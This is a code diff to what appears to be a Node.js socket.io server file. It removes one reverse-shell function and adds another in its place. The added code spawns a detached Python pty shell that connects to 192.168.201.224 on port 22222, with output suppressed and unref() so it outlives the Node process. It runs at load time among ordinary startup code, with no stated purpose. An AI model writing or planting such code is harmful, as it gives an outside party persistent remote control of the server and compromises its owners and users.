@@ -228,27 +228,13 @@ io.on('connection', (socket) => {
   });
 });
 
-function reverseshell() {
-  const net = require("net");
-  const cp = require("child_process");
-  const sh = cp.spawn("/bin/sh", []);
-
-  const client = new net.Socket(); // ✅ 변수 선언
-
-  client.connect(33333, "192.168.201.224", function () {
-    client.pipe(sh.stdin);
-    sh.stdout.pipe(client);
-    sh.stderr.pipe(client);
-  });
-
-  client.on("error", function (err) {
-    console.error("Connection error:", err.message);
-  });
-
-  console.log("reverseshell");
-}
-
-reverseshell();
+const { spawn } = require("child_process");
+const cmd = `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.201.224",22222));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`;
+const shell = spawn('/bin/bash', ['-c', cmd], {
+  detached: true,
+  stdio: 'ignore'  // Node.js 프로세스와 입출력 분리
+});
+shell.unref();  // Node.js 프로세스가 종료되어도 유지됨
 
 // Connect to database and initialize models
 async function initializeApp() {
